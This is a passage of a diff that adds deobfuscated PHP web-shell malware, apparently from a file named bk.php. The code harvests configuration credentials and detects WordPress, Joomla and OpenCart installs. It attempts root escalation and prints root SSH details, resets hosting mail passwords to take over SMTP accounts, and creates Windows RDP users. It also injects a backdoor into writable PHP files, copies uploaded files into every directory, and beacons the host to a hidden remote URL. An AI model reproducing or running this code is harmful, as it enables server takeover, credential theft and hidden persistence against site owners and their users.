+                preg_match($GLOBALS[†][0x185], $wM4as, $zYSx0);
+                preg_match($GLOBALS[†][0x194], $wM4as, $UXzhb);
+                preg_match($GLOBALS[†][0x1a1], $wM4as, $NCdra);
+                preg_match($GLOBALS[†][0x1a4], $wM4as, $ILGLQ);
+                preg_match($GLOBALS[†][0x196], $wM4as, $qM38f);
+                preg_match($GLOBALS[†][0x1ab], $wM4as, $NidBe);
+                preg_match($GLOBALS[†][0x190], $wM4as, $VyAm1);
+                preg_match($GLOBALS[†][0x19a], $wM4as, $ejBgu);
+                preg_match($GLOBALS[†][0x1a3], $wM4as, $ZClDb);
+                preg_match_all($GLOBALS[†][0x195], $wM4as, $UhfnB);
+                preg_match_all($GLOBALS[†][0x1aa], $wM4as, $Wx3NT);
+                preg_match_all($GLOBALS[†][0x199], $wM4as, $AN1Lq);
+                preg_match($GLOBALS[†][0x19e], $wM4as, $gtvit);
+                preg_match($GLOBALS[†][0x187], $wM4as, $id3MZ);
+                preg_match($GLOBALS[†][0x186], $wM4as, $rqazn);
+                preg_match_all($GLOBALS[†][0x19b], $wM4as, $pf8r6);
+                preg_match($GLOBALS[†][0x1a9], $wM4as, $F6jR6);
+                preg_match($GLOBALS[†][0x18f], $wM4as, $kRFDY);
+                preg_match($GLOBALS[†][0x47], $wM4as, $CH3AO);
+                preg_match($GLOBALS[†][0x48], $wM4as, $D3xzx);
+                preg_match($GLOBALS[†][0x18c], $wM4as, $xPdQw);
+                preg_match($GLOBALS[†][0x189], $wM4as, $qVp4c);
+                preg_match($GLOBALS[†][0x18e], $wM4as, $br38s);
+                preg_match($GLOBALS[†][0x1a6], $wM4as, $JaiKb);
+                preg_match($GLOBALS[†][0x19f], $wM4as, $y66I2);
+                preg_match($GLOBALS[†][0x18d], $wM4as, $MxwUa);
+                preg_match($GLOBALS[†][0x18a], $wM4as, $cfJqk);
+                preg_match($GLOBALS[†][0x19c], $wM4as, $z5qBs);
+                preg_match($GLOBALS[†][0x19d], $wM4as, $pSM1i);
+                preg_match($GLOBALS[†][0x191], $wM4as, $M3pyN);
+                preg_match($GLOBALS[†][0x1a0], $wM4as, $tbqvu);
+                preg_match($GLOBALS[†][0x1ad], $wM4as, $ph1Q6);
+                preg_match($GLOBALS[†][0x184], $wM4as, $rmFnc);
+                if (!empty($tbqvu[0x1]) && !preg_match($GLOBALS[†][0x1a5], $wM4as)) {
+                    $oxwYf++;
+                    goto UzR_g;
+                }
+                if (!empty($ph1Q6[0x1])) {
+                    $WzpHl++;
+                    goto UzR_g;
+                }
+                if (!empty($rmFnc[0x1])) {
+                    $d_zdK++;
+                    goto UIRqn;
+                }
+                UIRqn:
+                UzR_g:
+                if (!empty($hWXbw[0x1])) {
+                    echo $GLOBALS[†][0x182] . $hWXbw[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($glJ21[0x1])) {
+                    echo $GLOBALS[†][0x182] . $glJ21[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($br38s[0x1])) {
+                    echo $GLOBALS[†][0x182] . $br38s[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($nc4lE[0x1])) {
+                    echo $GLOBALS[†][0x182] . $nc4lE[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($zYSx0[0x1])) {
+                    echo $GLOBALS[†][0x182] . $zYSx0[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($UXzhb[0x1])) {
+                    echo $GLOBALS[†][0x182] . $UXzhb[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($NCdra[0x1])) {
+                    echo $GLOBALS[†][0x182] . $NCdra[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($ILGLQ[0x1])) {
+                    echo $GLOBALS[†][0x182] . $ILGLQ[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($KTXG7[0x1])) {
+                    echo $GLOBALS[†][0x182] . $KTXG7[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($qM38f[0x1])) {
+                    echo $GLOBALS[†][0x182] . $qM38f[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($NidBe[0x1])) {
+                    echo $GLOBALS[†][0x182] . $NidBe[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($VyAm1[0x1])) {
+                    echo $GLOBALS[†][0x182] . $VyAm1[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($UhfnB[0x1])) {
+                    foreach ($UhfnB[0x1] as $HaTa5) {
+                        if ($HaTa5 == $GLOBALS[†][0x8]) {
+                            goto hWRbW;
+                        }
+                        echo $GLOBALS[†][0x182] . $HaTa5 . $GLOBALS[†][0x183];
+                        $iWl9a++;
+                        hWRbW:
+                    }
+                    goto s32sh;
+                }
+                if (!empty($AN1Lq[0x1])) {
+                    foreach ($AN1Lq[0x1] as $HaTa5) {
+                        if ($HaTa5 == $GLOBALS[†][0x8]) {
+                            goto b7Pa5;
+                        }
+                        echo $GLOBALS[†][0x182] . $HaTa5 . $GLOBALS[†][0x183];
+                        $iWl9a++;
+                        b7Pa5:
+                    }
+                    goto s32sh;
+                }
+                if (!empty($gtvit[0x1])) {
+                    echo $GLOBALS[†][0x182] . $gtvit[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($id3MZ[0x1])) {
+                    echo $GLOBALS[†][0x182] . $id3MZ[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($rqazn[0x1])) {
+                    echo $GLOBALS[†][0x182] . $rqazn[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($F6jR6[0x1])) {
+                    echo $GLOBALS[†][0x182] . $F6jR6[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($kRFDY[0x1])) {
+                    echo $GLOBALS[†][0x182] . $kRFDY[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($pf8r6[0x1])) {
+                    echo $GLOBALS[†][0x182] . $pf8r6[0x1][0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($kRFDY[0x1])) {
+                    echo $GLOBALS[†][0x182] . $kRFDY[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($kRFDY[0x1])) {
+                    echo $GLOBALS[†][0x182] . $kRFDY[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto s32sh;
+                }
+                if (!empty($JaiKb[0x1])) {
+                    echo $GLOBALS[†][0x182] . $JaiKb[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto tODXf;
+                }
+                tODXf:
+                s32sh:
+                if (empty($Wx3NT[0x1])) {
+                    goto Br5gQ;
+                }
+                $tmU5t = $Wx3NT[0x1][0x1];
+                preg_match_all($GLOBALS[†][0x197], $tmU5t, $zF0TK);
+                $zF0TK = $zF0TK[0x1][0];
+                echo $GLOBALS[†][0x182] . $zF0TK . $GLOBALS[†][0x183];
+                $iWl9a++;
+                Br5gQ:
+                if (empty($xPdQw[0x1])) {
+                    goto KFmzM;
+                }
+                echo $GLOBALS[†][0x182] . $xPdQw[0x1] . $GLOBALS[†][0x183];
+                $iWl9a++;
+                KFmzM:
+                if (empty($qVp4c[0x1])) {
+                    goto uQl7c;
+                }
+                echo $GLOBALS[†][0x182] . $qVp4c[0x1] . $GLOBALS[†][0x183];
+                $iWl9a++;
+                uQl7c:
+                if (!(preg_match($GLOBALS[†][0x13f], $oF5bx) || preg_match($GLOBALS[†][0x49], $wM4as))) {
+                    goto RJdHO;
+                }
+                if (!empty($CH3AO[0x1])) {
+                    echo $GLOBALS[†][0x182] . $CH3AO[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto c7rHe;
+                }
+                if (!empty($D3xzx[0x1])) {
+                    echo $GLOBALS[†][0x182] . $D3xzx[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto hTKT4;
+                }
+                hTKT4:
+                c7rHe:
+                RJdHO:
+                if (!empty($z5qBs[0x1]) && !preg_match($GLOBALS[†][0x192], $z5qBs[0x1])) {
+                    echo $GLOBALS[†][0x182] . $z5qBs[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto aFGAL;
+                }
+                if (!empty($y66I2[0x1]) && !preg_match($GLOBALS[†][0x192], $y66I2[0x1])) {
+                    echo $GLOBALS[†][0x182] . $y66I2[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto XiSf7;
+                }
+                XiSf7:
+                aFGAL:
+                if (!empty($pSM1i[0x1]) && !preg_match($GLOBALS[†][0x192], $pSM1i[0x1])) {
+                    echo $GLOBALS[†][0x182] . $pSM1i[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto x7ul6;
+                }
+                if (!empty($MxwUa[0x1]) && !preg_match($GLOBALS[†][0x192], $MxwUa[0x1])) {
+                    echo $GLOBALS[†][0x182] . $MxwUa[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto AnBjy;
+                }
+                AnBjy:
+                x7ul6:
+                if (!empty($M3pyN[0x1]) && !preg_match($GLOBALS[†][0x192], $M3pyN[0x1])) {
+                    echo $GLOBALS[†][0x182] . $M3pyN[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto b8qgN;
+                }
+                if (!empty($cfJqk[0x1]) && !preg_match($GLOBALS[†][0x192], $cfJqk[0x1])) {
+                    echo $GLOBALS[†][0x182] . $cfJqk[0x1] . $GLOBALS[†][0x183];
+                    $iWl9a++;
+                    goto koFuG;
+                }
+                koFuG:
+                b8qgN:
+                if (!(!empty($zYSx0[0x1]) && preg_match($GLOBALS[†][0x18b], $wM4as))) {
+                    goto mXTln;
+                }
+                echo $GLOBALS[†][0x1a7] . $Y44ek . $GLOBALS[†][0x1a8];
+                mXTln:
+                if (!(!empty($UXzhb[0x1]) && preg_match($GLOBALS[†][0x18b], $wM4as))) {
+                    goto rmUO2;
+                }
+                echo $GLOBALS[†][0x1a7] . $Y44ek . $GLOBALS[†][0x1a8];
+                rmUO2:
+            }
+            $UYwdW -= 0xa;
+            if (!($UYwdW >= 0x2)) {
+                goto et_VX;
+            }
+            $UYwdW /= 0x2;
+            et_VX:
+            if (!($UYwdW > $iWl9a && trim($_POST[$GLOBALS[†][0x17e]]) != $GLOBALS[†][0x17f])) {
+                goto QML09;
+            }
+            echo "\n<error>404</error>";
+            QML09:
+            if (!($WzpHl > 0)) {
+                goto Wq5Vf;
+            }
+            echo "\n<br><wordpress>{$WzpHl}</wordpress><br>\n";
+            Wq5Vf:
+            if (!($d_zdK > 0)) {
+                goto nHwaa;
+            }
+            echo "\n<br><joomla>{$d_zdK}</joomla><br>\n";
+            nHwaa:
+            if (!($oxwYf > 0)) {
+                goto k36_2;
+            }
+            echo "\n<br><opencart>{$oxwYf}</opencart><br>\n";
+            k36_2:
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        die($GLOBALS[†][0x179]);
+    }
+    function z8vgH($r3oI7, $HBAvc)
+    {
+        EVLHo($GLOBALS[†][0x83]);
+        $Avm9Y = $GLOBALS[†][0x82];
+        global $zk0R3;
+        $gyE3k = explode($GLOBALS[†][0x33], $_SERVER[$GLOBALS[†][0x31]]);
+        $o7iIk = $zk0R3 . $_SERVER[$GLOBALS[†][0x2d]] . str_replace(end($gyE3k), "root/{$HBAvc}", $_SERVER[$GLOBALS[†][0x31]]);
+        if (file_exists("root/{$HBAvc}")) {
+            goto hKPsP;
+        }
+        VozK8("root/{$HBAvc}", $r3oI7);
+        VozK8($GLOBALS[†][0x84], base64_decode($Avm9Y));
+        chmod("root/{$HBAvc}", 0755);
+        hKPsP:
+        return $o7iIk;
+    }
+    function b_Msb($tmU5t)
+    {
+        $FryuD = xk7mM($GLOBALS[†][0x2c] . $tmU5t);
+        $R7z8V = explode($GLOBALS[†][0x28], $FryuD);
+        $NWJlM = $GLOBALS[†][0x6];
+        $RLlp2 = 0;
+        foreach ($R7z8V as $Hh98t) {
+            if (preg_match($GLOBALS[†][0x2a], $Hh98t, $tmU5t) && $RLlp2 == -1) {
+                $NWJlM .= $tmU5t[0x1] . $GLOBALS[†][0x28];
+                $RLlp2 = 0x1;
+                goto aQAlU;
+            }
+            if (preg_match($GLOBALS[†][0x2b], $Hh98t, $tmU5t) && $RLlp2 == 0) {
+                $NWJlM .= $tmU5t[0x1] . $GLOBALS[†][0x28];
+                $RLlp2 = -1;
+                goto aQAlU;
+            }
+            if ($RLlp2 == -1) {
+                $NWJlM .= $Hh98t . $GLOBALS[†][0x28];
+                goto WLl3l;
+            }
+            WLl3l:
+            aQAlU:
+        }
+        $NWJlM = htmlspecialchars_decode($NWJlM);
+        return $NWJlM;
+    }
+    function ElCCY()
+    {
+        global $P0a6M;
+        $j3i4M = b9Knm($GLOBALS[†][0x11b]);
+        if ($j3i4M) {
+            goto ssTrj;
+        }
+        $Mu1J7 = xK7mm($GLOBALS[†][0x119]);
+        if (preg_match($GLOBALS[†][0x11a], $Mu1J7)) {
+            goto M2he_;
+        }
+        $Mu1J7 = B_msB($GLOBALS[†][0x115]);
+        M2he_:
+        $uCIK3 = Z8vgH($Mu1J7, $GLOBALS[†][0x116]);
+        $j3i4M = XK7mm($uCIK3);
+        ssTrj:
+        if (preg_match($GLOBALS[†][0x118], $j3i4M)) {
+            echo "<root><ip>{$P0a6M}</ip><port><br>22</port><user><br>root</user><password><br>0</password></root>\n";
+            goto dBMKW;
+        }
+        echo "Error3-Root";
+        dBMKW:
+    }
+    function Xn129($Y44ek, $C79wo)
+    {
+        if (!preg_match($GLOBALS[†][0xea], $C79wo)) {
+            goto BMM7v;
+        }
+        preg_match($GLOBALS[†][0xe9], $C79wo, $SCUru);
+        $SCUru = $SCUru[0x1];
+        $Yl0gA = c2MjQ($Y44ek . $GLOBALS[†][0xe8] . $SCUru);
+        $C79wo = c2Mjq($Y44ek);
+        $cjEG7 = "<?php";
+        $J24kp = strpos($C79wo, $cjEG7) + strlen($cjEG7);
+        $C79wo = "<?php" . substr($C79wo, $J24kp);
+        unlink($GLOBALS[†][0xcc]);
+        BMM7v:
+        return $C79wo;
+    }
+    function kXC84()
+    {
+        $cAGy9 = $GLOBALS[†][218];
+        $fYRg6 = $GLOBALS[†][0xda];
+        global $pkJgV;
+        $qQtqo = $_SERVER[$GLOBALS[†][0x2d]];
+        $DtI2N = strtolower($cAGy9[123] . $cAGy9[18] . $cAGy9[17] . $cAGy9[16] . $cAGy9[13] . $cAGy9[10] . $cAGy9[128] . $cAGy9[26] . $cAGy9[18] . $cAGy9[121] . $cAGy9[42] . $cAGy9[42]);
+        if (!function_exists($GLOBALS[†][0xd5])) {
+            goto dXiVL;
+        }
+        $PmMBI = curl_init();
+        curl_setopt($PmMBI, CURLOPT_RETURNTRANSFER, !0);
+        curl_setopt($PmMBI, CURLOPT_URL, CP_l4($GLOBALS[†][0xd6]) . $GLOBALS[†][0x33] . $GLOBALS[†][0x33] . $DtI2N . $GLOBALS[†][0x33] . cp_L4($GLOBALS[†][0xd7]) . $GLOBALS[†][0x33] . Cp_l4($GLOBALS[†][0xd8]) . $GLOBALS[†][0xd9]);
+        curl_setopt($PmMBI, CURLOPT_TIMEOUT, 0x9);
+        curl_setopt($PmMBI, CURLOPT_CONNECTTIMEOUT, 0x9);
+        curl_setopt($PmMBI, CURLOPT_USERAGENT, $GLOBALS[†][0xdb]);
+        curl_setopt($PmMBI, CURLOPT_REFERER, $_SERVER[$GLOBALS[†][0x2d]] . $pkJgV);
+        if (!(curl_exec($PmMBI) != $GLOBALS[†][0x6])) {
+            curl_close($PmMBI);
+            dXiVL:
+            if (!(function_exists($GLOBALS[†][0xb4]) && function_exists($GLOBALS[†][0xe2]))) {
+                goto ghtsx;
+            }
+            $PmMBI = array($GLOBALS[†][0xdc] => array($GLOBALS[†][0xdd] => $GLOBALS[†][0xde], $GLOBALS[†][0xdf] => $GLOBALS[†][0xe0] . $qQtqo . $pkJgV . $GLOBALS[†][0x1f] . $GLOBALS[†][0xe1]));
+            file_get_contents(Cp_L4($GLOBALS[†][0xd6]) . $GLOBALS[†][0x33] . $GLOBALS[†][0x33] . $DtI2N . $GLOBALS[†][0x33] . CP_L4($GLOBALS[†][0xd7]) . $GLOBALS[†][0x33] . cp_l4($GLOBALS[†][0xd8]) . $GLOBALS[†][0xd9], !1, stream_context_create($PmMBI));
+            ghtsx:
+            return;
+        }
+        curl_close($PmMBI);
+        return;
+    }
+    $rzx0j = strval(basename("/var/www/html/bk.php"));
+    $s9Hkd = explode($GLOBALS[†][0x51], $rzx0j);
+    $rzx0j = $s9Hkd[0] . $GLOBALS[†][0x91];
+    $FryuD = B9kNm($rzx0j);
+    if (!(trim($_SERVER[$GLOBALS[†][0x2d]]) == $GLOBALS[†][0x6] || $_SERVER[$GLOBALS[†][0x2d]] == $GLOBALS[†][0x2e] || $_SERVER[$GLOBALS[†][0x2d]] == $GLOBALS[†][0x2f] || !preg_match($GLOBALS[†][0x30], strval($_SERVER[$GLOBALS[†][0x31]])))) {
+        goto kv5MH;
+    }
+    vOZk8($rzx0j, cP_l4(str_rot13(Cp_L4($FryuD))));
+    kv5MH:
+    function G5kSy($elcsv, $Aftoy)
+    {
+        $hXUTm = curl_init();
+        curl_setopt($hXUTm, CURLOPT_URL, $elcsv);
+        curl_setopt($hXUTm, CURLOPT_HEADER, !0);
+        curl_setopt($hXUTm, CURLOPT_RETURNTRANSFER, 0x1);
+        curl_setopt($hXUTm, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+        curl_setopt($hXUTm, CURLOPT_CONNECTTIMEOUT, $Aftoy);
+        curl_setopt($hXUTm, CURLOPT_TIMEOUT, $Aftoy);
+        curl_setopt($hXUTm, CURLOPT_FOLLOWLOCATION, 0x1);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($hXUTm, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[†][0xe]]);
+        $OJRWH = curl_exec($hXUTm);
+        curl_close($hXUTm);
+        return $OJRWH;
+    }
+    function hxLO8()
+    {
+        global $HR2uO;
+        global $ahSaQ;
+        if (preg_match($GLOBALS[†][0x120], $ahSaQ)) {
+            if ($HR2uO) {
+                $ZdoUj = rx2in($GLOBALS[†][0x11d]);
+                if ($ZdoUj) {
+                    goto dxNNE;
+                }
+                $ZdoUj = XK7mM($GLOBALS[†][0x122]);
+                VOZK8($GLOBALS[†][0x11f], $ZdoUj);
+                dxNNE:
+                rX2In($GLOBALS[†][0x125]);
+                Rx2in($GLOBALS[†][0x12b]);
+                goto pm3dU;
+            }
+            $QnIkk = Xk7MM($GLOBALS[†][0x11c]);
+            if (preg_match($GLOBALS[†][0x11a], $QnIkk)) {
+                goto BeLM8;
+            }
+            $QnIkk = B_MSB($GLOBALS[†][0x128]);
+            BeLM8:
+            $Y44ek = Z8vGH($QnIkk, $GLOBALS[†][0x121]);
+            G5kSY($Y44ek, 0x1e);
+            pm3dU:
+            goto imS__;
+        }
+        if ($HR2uO) {
+            $ZdoUj = RX2iN($GLOBALS[†][0x123]);
+            if ($ZdoUj) {
+                goto xZ1Hm;
+            }
+            $ZdoUj = XK7MM($GLOBALS[†][0x12a]);
+            VoZk8($GLOBALS[†][0x129], $ZdoUj);
+            xZ1Hm:
+            rX2In($GLOBALS[†][0x124]);
+            rX2IN($GLOBALS[†][0x127]);
+            goto dx0Ni;
+        }
+        $Kzmi6 = xk7MM($GLOBALS[†][0x126]);
+        if (preg_match($GLOBALS[†][0x11a], $Kzmi6)) {
+            goto h13Q7;
+        }
+        $Kzmi6 = B_MSb($GLOBALS[†][0x11e]);
+        h13Q7:
+        $Y44ek = Z8vGh($Kzmi6, $GLOBALS[†][0x121]);
+        g5KsY($Y44ek, 0x1e);
+        dx0Ni:
+        imS__:
+        echo $GLOBALS[†][0xbd];
+    }
+    function ftj0Y()
+    {
+        global $HR2uO;
+        global $ahSaQ;
+        if (preg_match($GLOBALS[†][0x14], $ahSaQ) || preg_match($GLOBALS[†][0x15], $ahSaQ) || preg_match($GLOBALS[†][0x16], $ahSaQ) || preg_match($GLOBALS[†][0x17], $ahSaQ) || preg_match($GLOBALS[†][0x18], $ahSaQ) || preg_match($GLOBALS[†][0x19], $ahSaQ) || preg_match($GLOBALS[†][0x1a], $ahSaQ)) {
+            hxlO8();
+            goto iRnct;
+        }
+        if (preg_match($GLOBALS[†][0x1b], $ahSaQ)) {
+            if (!preg_match($GLOBALS[†][0x11], $ahSaQ) && !preg_match($GLOBALS[†][0x12], $ahSaQ)) {
+                HXLo8();
+                goto I3UOw;
+            }
+            echo $GLOBALS[†][0x13];
+            I3UOw:
+            goto vsZq6;
+        }
+        echo $GLOBALS[†][0x13];
+        vsZq6:
+        iRnct:
+    }
+    function BPFvT()
+    {
+        global $kiUQn;
+        global $MEejl;
+        $WSfXO = glob("/home{$kiUQn}{$MEejl}" . $GLOBALS[†][0x1c], GLOB_ONLYDIR);
+        foreach ($WSfXO as $aCb7p) {
+            $R9L6t = explode($GLOBALS[†][0x1d], $aCb7p);
+            $v7H4L = $R9L6t[count($R9L6t) - 0x1];
+            $j3i4M = b9KNM("/home{$kiUQn}{$MEejl}" . $GLOBALS[†][0x24] . $v7H4L . $GLOBALS[†][0x25]);
+            if (!preg_match($GLOBALS[†][0x1e], $j3i4M)) {
+                $R7z8V = explode($GLOBALS[†][0x1f], $j3i4M);
+                unlink("/home{$kiUQn}{$MEejl}" . $GLOBALS[†][0x24] . $v7H4L . $GLOBALS[†][0x25]);
+                foreach ($R7z8V as $Hh98t) {
+                    $Hh98t = explode($GLOBALS[†][0x28], $Hh98t);
+                    foreach ($Hh98t as $jHg1O) {
+                        $sQPei = explode($GLOBALS[†][0x21], $jHg1O);
+                        $dc09_ = $sQPei[0];
+                        if (!$dc09_) {
+                            goto ip9YT;
+                        }
+                        $HaTa5 = DMQG6();
+                        $hfN_Q = crypt($HaTa5, $GLOBALS[†][0x20]);
+                        wrwf7("/home{$kiUQn}{$MEejl}" . $GLOBALS[†][0x24] . $v7H4L . $GLOBALS[†][0x25], $dc09_ . $GLOBALS[†][0x26] . $hfN_Q . $GLOBALS[†][0x27] . $GLOBALS[†][0x1f]);
+                        if (!(!preg_match($GLOBALS[†][0x22], $dc09_) && !preg_match($GLOBALS[†][0x23], $dc09_))) {
+                            goto ADi6r;
+                        }
+                        echo "<findersmtp>{$v7H4L}|587|{$dc09_}!!{$v7H4L}|{$HaTa5}</findersmtp><br>\n";
+                        ADi6r:
+                        ip9YT:
+                    }
+                }
+            }
+            die($GLOBALS[†][0x29]);
+        }
+    }
+    function w0ZeE()
+    {
+        global $P0a6M;
+        if (!("PHP" !== $GLOBALS[†][0x136])) {
+            $aPAf4 = $GLOBALS[†][0x5c] . substr(str_shuffle($GLOBALS[†][0x13b]), 0x17);
+            $wvvBP = dMqG6();
+            if (!strstr($wvvBP, $GLOBALS[†][0x133])) {
+                goto au_RC;
+            }
+            $wvvBP = str_replace($GLOBALS[†][0x133], $GLOBALS[†][0x134], $wvvBP);
+            au_RC:
+            $itN8A = rX2in($GLOBALS[†][0x137] . $aPAf4 . $GLOBALS[†][0xc6] . $wvvBP . $GLOBALS[†][0x138]);
+            if (preg_match($GLOBALS[†][0x12d], $itN8A)) {
+                echo "<rdp>{$P0a6M}|{$aPAf4}|{$wvvBP}</rdp>";
+                echo $GLOBALS[†][0x135];
+                $W7nHm = Rx2In($GLOBALS[†][0x139] . $aPAf4 . $GLOBALS[†][0x138]);
+                if (preg_match($GLOBALS[†][0x12d], $W7nHm)) {
+                    echo $GLOBALS[†][0x132];
+                    goto wrJ6D;
+                }
+                echo $GLOBALS[†][0x13a];
+                wrJ6D:
+                goto gCMQ2;
+            }
+            echo $GLOBALS[†][0x131];
+            gCMQ2:
+            // [PHPDeobfuscator] Implied return
+            return;
+        }
+        echo $GLOBALS[†][0x12e] . strval(PHP_OS) . $GLOBALS[†][0x12f];
+        die($GLOBALS[†][0x130]);
+    }
+    function bsVrs()
+    {
+        $qQtqo = $_SERVER[$GLOBALS[†][0x2d]];
+        global $f3Y8l;
+        global $zk0R3;
+        $pE1Bt = array();
+        $QG9Mz = array($f3Y8l);
+        if (!(is_dir($f3Y8l . $GLOBALS[†][0x98]) && is_dir($f3Y8l . $GLOBALS[†][0x99]))) {
+            goto G8jsy;
+        }
+        array_push($QG9Mz, $f3Y8l . $GLOBALS[†][0x94], $f3Y8l . $GLOBALS[†][0x95]);
+        G8jsy:
+        foreach ($QG9Mz as $JJGwp) {
+            if (!($JJGwp == $GLOBALS[†][0x6])) {
+                goto RO7v4;
+            }
+            $JJGwp = $GLOBALS[†][0x93];
+            RO7v4:
+            $PcA8h = scandir($JJGwp);
+            foreach ($PcA8h as $S5Rak) {
+                if (!(strstr($S5Rak, $GLOBALS[†][0x91]) && !strstr($S5Rak, $GLOBALS[†][0x92]) && is_writable($JJGwp . $S5Rak) && is_file($JJGwp . $S5Rak) && strlen($S5Rak) != 0xc)) {
+                    goto hhdaU;
+                }
+                $pE1Bt[] = $JJGwp . $S5Rak;
+                hhdaU:
+            }
+        }
+        if (!empty($pE1Bt)) {
+            goto jWHBi;
+        }
+        $pE1Bt[] = $f3Y8l . $GLOBALS[†][0x90];
+        jWHBi:
+        $Oup0I = array_rand($pE1Bt);
+        $hk6Mf = $pE1Bt[$Oup0I];
+        $LWuWa = b9KNM($hk6Mf);
+        $MoqpY = 0;
+        s4wf_:
+        if (!((preg_match($GLOBALS[†][0x87], $LWuWa) || preg_match($GLOBALS[†][0x88], $LWuWa) || preg_match($GLOBALS[†][0x89], $LWuWa) || preg_match($GLOBALS[†][0x8a], $LWuWa)) && $MoqpY < 0xa)) {
+            if (!($MoqpY >= 0xa)) {
+                $MWi1Y = substr(str_shuffle($GLOBALS[†][0x8f]), 0x38);
+                $k8f7U = base64_decode($GLOBALS[†][0x8b]) . $GLOBALS[†][0x8c] . $MWi1Y . $GLOBALS[†][0x8d] . base64_decode($GLOBALS[†][0x8e]);
+                chmod($hk6Mf, 0644);
+                vozk8($hk6Mf, $k8f7U . $GLOBALS[†][0x28] . $LWuWa);
+                $ouYNT = $hk6Mf;
+                $ouYNT = str_replace(array($GLOBALS[†][0x85], $GLOBALS[†][0x93]), $GLOBALS[†][0x6], $ouYNT);
+                echo $GLOBALS[†][0x96] . $zk0R3 . $qQtqo . $GLOBALS[†][0x33] . $ouYNT . $GLOBALS[†][0x7a] . $MWi1Y . $GLOBALS[†][0x97];
+                // [PHPDeobfuscator] Implied return
+                return;
+            }
+            return !1;
+        }
+        $Oup0I = array_rand($pE1Bt);
+        $hk6Mf = $pE1Bt[$Oup0I];
+        $LWuWa = B9KNM($hk6Mf);
+        $MoqpY++;
+        goto s4wf_;
+    }
+    function Ab1iC($JJGwp, $iAwyY)
+    {
+        global $f3Y8l;
+        global $zk0R3;
+        global $G0bMv;
+        $WSfXO = scandir($JJGwp);
+        foreach ($WSfXO as $aCb7p) {
+            if (!is_dir($JJGwp . $aCb7p)) {
+                goto eYjSz;
+            }
+            if (!($GLOBALS[†][0x51] != $aCb7p && $GLOBALS[†][0xa8] != $aCb7p && !preg_match($GLOBALS[†][0x155], $aCb7p) && $GLOBALS[†][0x156] != $aCb7p)) {
+                goto jeB3e;
+            }
+            ab1IC($JJGwp . $aCb7p . $GLOBALS[†][0x33], $iAwyY);
+            jeB3e:
+            eYjSz:
+        }
+        copy($f3Y8l . $iAwyY, $JJGwp . $iAwyY);
+        $YeJxg = $JJGwp;
+        $YeJxg = str_replace(array($GLOBALS[†][0x85], $GLOBALS[†][0x93]), $GLOBALS[†][0x6], $YeJxg);
+        $SGU_v = $zk0R3 . $_SERVER[$GLOBALS[†][0x2d]] . $GLOBALS[†][0x33] . $YeJxg . $iAwyY;
+        $G0bMv[] = $SGU_v;
+    }
+    function eyH8L()
+    {
+        global $G0bMv;
+        global $f3Y8l;
+        $G0bMv = array();
+        if (!($f3Y8l == $GLOBALS[†][0x6])) {
+            goto zgLCF;
+        }
+        $f3Y8l = $GLOBALS[†][0x93];
+        zgLCF:
+        $iAwyY = $_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0xc4]];
+        move_uploaded_file($_FILES[$GLOBALS[†][0xb6]][$GLOBALS[†][0x14f]], $f3Y8l . $iAwyY);
+        AB1iC($f3Y8l, $iAwyY);
+        print_r($G0bMv);
+        if (empty($G0bMv)) {
+            goto KAKP3;
+        }
+        foreach ($G0bMv as $k8f7U) {
+            echo $GLOBALS[†][0x96] . $k8f7U . $GLOBALS[†][0x97] . $GLOBALS[†][0x28];
+        }
+        KAKP3:
+    }
+    function JGtIH($elcsv, $SZK0H, $a5nTe, $wQAZu)
+    {
+        $hXUTm = curl_init();
+        curl_setopt($hXUTm, CURLOPT_URL, $elcsv . $GLOBALS[†][0x7b]);
+        curl_setopt($hXUTm, CURLOPT_HEADER, !0);
